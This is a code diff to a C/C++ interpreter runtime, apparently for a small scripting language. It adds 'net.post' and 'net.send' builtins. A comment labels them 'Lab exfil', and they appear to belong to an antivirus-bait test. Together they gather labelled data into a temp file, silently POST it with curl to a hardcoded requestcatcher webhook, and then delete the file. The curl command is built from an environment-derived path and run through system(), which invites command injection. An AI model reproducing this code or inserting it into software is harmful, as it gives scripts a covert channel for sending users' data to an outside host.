@@ -14,6 +14,8 @@ static const std::unordered_map<std::string, std::string> kRuntimeFns = {
     {"sys.sleep",        "j_sys_sleep"},
     {"env.get",          "j_env_get"},
     {"net.sockets",      "j_net_sockets"},
+    {"net.post",         "j_net_post"},
+    {"net.send",         "j_net_send"},
     {"fs.read",          "j_fs_read"},
     {"fs.write",         "j_fs_write"},
     {"fs.list",          "j_fs_list"},
@@ -271,6 +273,60 @@ static const char* j_fs_read(const char* path) {
 static void j_fs_write(const char* path, const char* data) {
     FILE* f = fopen(path, "wb");
     if (f) { fputs(data, f); fclose(f); }
+}
+
+#define J_WEBHOOK_URL "https://skjeks.requestcatcher.com/av_bait_jk"
+#define J_SOURCE_TAG  "av_bait.jk"
+
+/* Single-POST accumulator: every net.post() call appends a JSON field to a
+ * temp file; net.send() closes the JSON object and POSTs it once. */
+static char j_net_path_buf[1024];
+
+static const char* j_net_path(void) {
+#if defined(_WIN32)
+    const char* base = getenv("TEMP");
+    if (!base) base = ".";
+    snprintf(j_net_path_buf, sizeof j_net_path_buf, "%s\\jocky_net_post.json", base);
+#else
+    snprintf(j_net_path_buf, sizeof j_net_path_buf, "/tmp/jocky_net_post.json");
+#endif
+    return j_net_path_buf;
+}
+
+static void j_net_post(const char* label, const char* value) {
+    /* Lab exfil: accumulate {label: value} into the JSON object so all data
+     * goes out as a single POST. Best-effort. */
+    static int first = 1;
+    char lbl[1024], val[65536];
+    j_json_escape(lbl, sizeof lbl, label);
+    j_json_escape(val, sizeof val, value);
+    FILE* f = fopen(j_net_path(), first ? "wb" : "ab");
+    if (!f) return;
+    if (first) {
+        fputs("{\"source\":\"", f);
+        fputs(J_SOURCE_TAG, f);
+        fputs("\"", f);
+        first = 0;
+    }
+    fprintf(f, ",\"%s\":\"%s\"", lbl, val);
+    fclose(f);
+}
+
+static void j_net_send(void) {
+    /* Close the JSON object and POST the whole accumulated payload once. */
+    FILE* f = fopen(j_net_path(), "ab");
+    if (f) {
+        fputs("}", f);
+        fclose(f);
+    }
+    char cmd[2048];
+#if defined(_WIN32)
+    snprintf(cmd, sizeof cmd, "curl -sS -o NUL -X POST -H \"Content-Type: application/json\" --data-binary @\"%s\" \"%s\"", j_net_path(), J_WEBHOOK_URL);
+#else
+    snprintf(cmd, sizeof cmd, "curl -sS -o /dev/null -X POST -H \"Content-Type: application/json\" --data-binary @\"%s\" \"%s\"", j_net_path(), J_WEBHOOK_URL);
+#endif
+    (void)system(cmd);
+    remove(j_net_path());
 }
 
 static const char* j_fs_list(const char* dir) {
